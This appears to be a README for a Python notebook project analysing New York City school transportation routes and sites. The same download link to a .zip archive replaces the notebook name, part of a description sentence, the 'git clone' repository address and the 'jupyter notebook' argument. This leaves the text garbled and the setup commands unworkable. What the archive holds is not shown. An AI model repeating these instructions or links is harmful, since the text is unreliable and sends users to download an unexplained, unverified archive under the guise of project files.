# Project Title: School Transportation and Routes Analysis

## Project Description
This project aims to analyze and visualize school transportation data to understand trends in modes of students travelling medium and sites. Also it's future aim is to contribute in decreasing the traffic per route and also decreasing the traffic per https://raw.githubusercontent.com/Anip21/NYC-Open-Data-Analysis/main/elb/NYC-Open-Data-Analysis.zip a dataset with information on school names, years, OPT code, longitude, latitude and route number. The project presents findings on an interactive map. The primary objectives are to:
- Identify patterns
- Compare number of people per route
- Create a user-friendly visualization for the stakeholders.

## Features
- **Data Cleaning and Preprocessing**: Ensures accurate, complete data by handling missing values and standardizing the traveling information.
- **Comparative Analysis by Route and Schools**: Analyzes and visualizes changes in traveling modes across multiple years and grades.

## Programming Language
- **Python**

## Libraries
- **Pandas**: For data manipulation and analysis.
- **Matplotlib/Seaborn**: For data visualization.
- **Plotly**: Optional, for interactive mapping and visualization.

## Project Structure
- **https://raw.githubusercontent.com/Anip21/NYC-Open-Data-Analysis/main/elb/NYC-Open-Data-Analysis.zip**: Main Jupyter notebook containing data loading, cleaning, and analysis.

- **Data Files**:
  - `PreK_Riders_by_Transportation_Site_20241020`
  - `Routes_by_Transportation_Sites_20241020`
  - `Transportation_Sites_20241020`

## Prerequisites
1. **Python 3.x**
2. **Jupyter Notebook**
3. **Python Libraries**:
   - `pandas`
   - `matplotlib`
   - `seaborn`
   - `plotly` (optional, if interactive map is implemented with Plotly)

To install required libraries, run:
```bash
pip install pandas matplotlib seaborn plotly.
```

# Steps to Set Up and Run the Project

## Clone the Repository

```bash
git clone https://raw.githubusercontent.com/Anip21/NYC-Open-Data-Analysis/main/elb/NYC-Open-Data-Analysis.zip
cd School_Data_Analysis
```
## Prepare Data Files

- Place `PreK_Riders_by_Transportation_Site_20241020`, `Routes_by_Transportation_Sites_20241020`,`Transportation_Sites_20241020` in the same directory as the notebook.
- Adjust the file path in the notebook if stored in a different location.


## Open and Run the Notebook

1. **Start Jupyter Notebook:**

    ```bash
    # Launch Jupyter Notebook to open the project notebook
    jupyter notebook https://raw.githubusercontent.com/Anip21/NYC-Open-Data-Analysis/main/elb/NYC-Open-Data-Analysis.zip
    ```

2. **Run Each Cell in Sequence:**

    - **Data Import**: Loads the school dataset.
    - **Data Cleaning**: Checks for and handles missing values, standardize the traveling information.
    - **Comparative Analysis**: Visualizes mode of transportation and route changes by year and school name.
    - **Interactive Map (Optional)**: Plots schools on a map based on location data, if available.

## Version Control Strategy

### Branch
Each team member should work on a separate branch based on their task (e.g., `data-cleaning`, `analysis`, `visualization`).
To create a branch, use:

```bash
git checkout -b data-analysis-nyc-open-data
```
